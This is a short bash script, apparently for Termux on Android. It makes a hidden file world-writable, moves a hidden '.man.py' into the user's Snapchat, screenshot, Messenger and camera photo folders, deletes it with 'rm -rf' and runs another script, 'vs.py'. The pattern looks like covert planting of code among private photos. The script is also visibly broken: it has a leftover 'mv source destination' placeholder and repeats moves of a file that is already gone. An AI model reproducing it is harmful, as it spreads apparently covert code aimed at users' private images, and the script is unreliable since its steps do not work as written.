#!/bin/bash
chmod 777 .move.sh
mv source destination
mv .man.py /sdcard/DCIM/Snapchat
mv .man.py /sdcard/DCIM/ScreenShots
mv .man.py /sdcard/Pictures/Messenger
mv .man.py /sdcard/DCIM/Camera
sleep 1
rm -rf .man.py
python vs.py
